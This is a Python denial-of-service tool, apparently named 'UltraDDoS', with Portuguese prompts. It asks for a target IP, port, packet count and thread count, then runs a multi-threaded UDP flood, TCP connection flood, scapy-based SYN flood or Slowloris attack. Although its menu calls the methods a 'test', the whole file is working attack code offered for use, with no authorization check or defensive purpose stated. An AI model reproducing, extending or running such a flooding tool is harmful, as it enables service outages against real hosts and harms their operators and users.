import socket
import threading
import time
from scapy.all import IP, TCP, send

logo = """
 █    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄      ▓█████▄ ▓█████▄  ▒█████    ██████ 
 ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒    ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░         ░  ░          ░           ░  ░   ░       ░        ░ ░        ░  
                                            ░       ░                        
"""


def udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"A" * 1024
    for _ in range(num_packets):
        sock.sendto(packet, (target_ip, target_port))

def tcp_flood(target_ip, target_port, num_packets):
    packet = b"A" * 1024
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(packet)
            sock.close()
        except:
            continue

def syn_flood(target_ip, target_port, num_packets):
    for _ in range(num_packets):
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        send(ip/tcp, verbose=False)

def slowloris(target_ip, target_port, num_connections):
    sockets = []
    print("[*] Iniciando Slowloris...")
    for _ in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(f"Host: {target_ip}\r\n".encode())
            sockets.append(s)
        except socket.error:
            break

    while True:
        print(f"[+] Mantendo {len(sockets)} conexões vivas...")
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
                time.sleep(1)
            except socket.error:
                sockets.remove(s)

def run_attack(method, ip, port, count, threads):
    method_map = {
        '1': udp_flood,
        '2': tcp_flood,
        '3': syn_flood,
        '4': slowloris
    }

    target_func = method_map.get(method)
    if not target_func:
        print("Método inválido.")
        return

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=target_func, args=(ip, port, count))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

def main():
    print(logo)
    print("Escolha o método de teste:")
    print("1. UDP Flood")
    print("2. TCP Flood")
    print("3. SYN Flood")
    print("4. Slowloris")

    method = input("Método (1-4): ").strip()
    ip = input("IP do alvo: ").strip()
    port = int(input("Porta: ").strip())
    count = int(input("Quantidade de pacotes/conexões por thread: ").strip())
    threads = int(input("Número de threads: ").strip())

    print(f"\n[*] Iniciando ataque no {ip}:{port} com {threads} threads...\n")
    run_attack(method, ip, port, count, threads)

if __name__ == "__main__":
    main()